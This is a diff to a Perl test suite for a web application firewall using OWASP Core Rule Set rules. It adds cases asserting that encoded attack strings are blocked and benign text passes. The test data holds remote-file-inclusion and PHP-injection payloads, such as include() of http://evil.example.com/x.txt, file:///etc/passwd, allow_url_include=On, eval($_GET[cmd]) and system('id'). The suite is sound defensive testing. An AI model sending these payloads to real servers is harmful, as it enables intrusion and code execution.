@@ -88,7 +88,7 @@ $t->write_file('nginx.conf', $conf);
 # ("directory index is forbidden") which would mask WAF verdicts.
 $t->write_file('index.html', 'ok');
 
-$t->run()->plan(24);
+$t->run()->plan(30);
 
 # fresh connection per request so a BLOCK cannot poison the next one
 sub crs_get {
@@ -129,18 +129,29 @@ unlike(crs_get_ua('/', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
     qr/403 Forbidden/, '913100: normal browser UA passes');
 unlike(crs_get_ua('/', 'curl/8.4.0'),
     qr/403 Forbidden/, '913100: curl UA passes');
+unlike(crs_get_ua('/', 'Mozilla/5.0 (Linux; Android 13; Nexus 7 Build/JDQ39) '
+        . 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36'),
+    qr/403 Forbidden/, '913100: "Nexus 7" in a browser UA passes');
+unlike(crs_get_ua('/', 'python-nmap/0.7.1'),
+    qr/403 Forbidden/, '913100: python-nmap library UA passes');
 
 # ---------------------------------------------------------------------------
 # 931100/931120: remote file inclusion (ARGS)
 # ---------------------------------------------------------------------------
 like(crs_get('/?q=file%3A%2F%2F%2Fetc%2Fpasswd'),
-    qr/403 Forbidden/, '931100: file:// URI with path blocked');
+    qr/403 Forbidden/, '931100: file:// URI with empty host blocked');
 like(crs_get('/?q=https%3A%2F%2F127.0.0.1%2Fshell.php'),
     qr/403 Forbidden/, '931100: https URL with IP host blocked');
 like(crs_get('/?q=ssh%3A%2F%2F10.0.0.1%2Fetc%2Fpasswd'),
     qr/403 Forbidden/, '931100: ssh URL with IP host blocked');
 unlike(crs_get('/?q=https%3A%2F%2Fexample.com%2Fpage%3Fid%3D42'),
     qr/403 Forbidden/, '931100: benign https URL passes');
+like(crs_get('/?q=include%28http%3A%2F%2Fevil.example.com%2Fx.txt%29'),
+    qr/403 Forbidden/, '931110: include() of a remote URL blocked');
+like(crs_get('/?q=appserv_root%3Dfile%3A%2F%2F%2Fetc%2Fpasswd'),
+    qr/403 Forbidden/, '931110: appserv_root pointing at file:// blocked');
+unlike(crs_get('/?q=include+this+in+the+report'),
+    qr/403 Forbidden/, '931110: prose containing "include" passes');
 like(crs_get('/?q=file%3A%2F%2F%2Fetc%2Fpasswd%3F'),
     qr/403 Forbidden/, '931120: file URI ending with ? blocked');
 like(crs_get('/?q=http%3A%2F%2Fexample.com%2F%3F'),
@@ -155,19 +166,21 @@ like(crs_get('/?q=%3C%3Fphp%20phpinfo%28%29%3B'),
     qr/403 Forbidden/, '933100: <?php tag blocked');
 like(crs_get('/?q=%3C%3F%3D%20eval%28%24_GET%5Bcmd%5D%29%20%3F%3E'),
     qr/403 Forbidden/, '933100: <?= short tag blocked');
-like(crs_get('/?q=%24_GET%5Bcmd%5D'),
-    qr/403 Forbidden/, '933110: $_GET superglobal blocked');
-like(crs_get('/?q=%24_SERVER%5BREQUEST_URI%5D'),
-    qr/403 Forbidden/, '933110: $_SERVER superglobal blocked');
-unlike(crs_get('/?q=%24GET'),
-    qr/403 Forbidden/, '933110: bare $GET (no underscore) passes');
+like(crs_get('/?q=file%5B%5D%3Dphpinfo%28%29'),
+    qr/403 Forbidden/, '933120: phpinfo() blocked');
+like(crs_get('/?q=allow_url_include%3DOn'),
+    qr/403 Forbidden/, '933120: allow_url_include assignment blocked');
+like(crs_get('/?q=%3C%3Fphp%20system%28%27id%27%29%3B'),
+    qr/403 Forbidden/, '933160: system() blocked');
 like(crs_get('/?q=eval%28%24_GET%5Bcmd%5D%29'),
-    qr/403 Forbidden/, '933111: eval() blocked');
-like(crs_get('/?q=system%28%27id%27%29'),
-    qr/403 Forbidden/, '933111: system() blocked');
+    qr/403 Forbidden/, '933160: eval() blocked');
+like(crs_get('/?q=include%28%27local.php%27%29'),
+    qr/403 Forbidden/, '933160: include() blocked');
 unlike(crs_get('/?q=evaluated+expression'),
-    qr/403 Forbidden/, '933111: word containing eval passes');
+    qr/403 Forbidden/, '933160: word containing eval passes');
 unlike(crs_get('/?q=systematic+review'),
-    qr/403 Forbidden/, '933111: word containing system passes');
+    qr/403 Forbidden/, '933160: word containing system passes');
+unlike(crs_get('/?q=%3C%3Fxml+version%3D%221.0%22%3F%3E'),
+    qr/403 Forbidden/, '933100: XML declaration passes');
 
 # ---------------------------------------------------------------------------
